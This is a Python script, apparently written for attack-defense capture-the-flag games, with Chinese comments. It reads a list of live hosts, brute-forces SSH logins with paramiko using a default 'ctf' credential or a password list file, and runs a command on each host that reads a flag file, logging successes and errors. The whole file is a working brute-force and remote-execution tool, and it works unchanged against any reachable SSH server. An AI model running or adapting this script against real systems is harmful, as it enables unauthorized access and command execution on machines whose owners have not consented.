#-*- coding:utf-8 -*-
import paramiko

# ssh 用户名 密码 登陆
# 同py文件目录下创建 alived.txt   >>存放存活主机的 ip
# 同py文件目录下创建  run_result.txt  >> 存放执行结果
# cmd 命令可进行更改，在main函数中进行更改
def ssh_base_pwd(ip,port,username,passwd,cmd='cat /flag.txt'):
    port = int(port)
    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=ip, port=port, username=username, password=passwd, timeout=3)
    stdin,stdout,stderr = ssh.exec_command(cmd)

    result = stdout.read()
    if not result :
        print("无结果!")
        result = stderr.read()
    ssh.close()
    return result.decode()
    
def read_ip_from_txt():
    ip_file = open("./alived.txt", 'r')
    ips = ip_file.readlines()
    ip_clear = list(map(lambda ip_temp : ip_temp[:-1], ips))
    ip_file.close()
    return ip_clear

def deal_result(username, password):
    ip_list = read_ip_from_txt()
    result_file = open("./run_result.txt", 'w')
    result_error_file = open("./run_error_result.txt", 'w')
    run_result = ""
    cmd = "cat /var/www/html/flag.txt"
    for ip_temp in ip_list:
        for password_single in password:
            try:
                result = ssh_base_pwd(ip_temp, 22, username, password_single, cmd)
                result = result.replace('\n', '').replace('\r', '')
                run_result = "{0} [{2},{3}] >> exec result: {1}".format(ip_temp, result, username, password_single)
                result_file.write(run_result + '\n')
                break
            except Exception as identifier:
                run_result = "{0} [{2},{3}] >> exec result: {1}".format(ip_temp, identifier, username, password_single)
                result_error_file.write(run_result + '\n')
    print("end.......")
    result_file.close()
    result_error_file.close()

def main():
    # 是否进行暴力猜解 0=否、1=是
    v_g_flag = 1
    username = "ctf"
    password = ["ctf"]
    if v_g_flag == 0:
        deal_result(username, password)
    elif v_g_flag == 1:
        password_list_file = open("./password_list.txt").readlines()
        password_list = list(map(lambda password_temp :  password_temp.replace("\n", "").replace("\r", ""), password_list_file))
        # print(password_list)
        deal_result(username, password_list)
        
        
if __name__ == '__main__':
    main()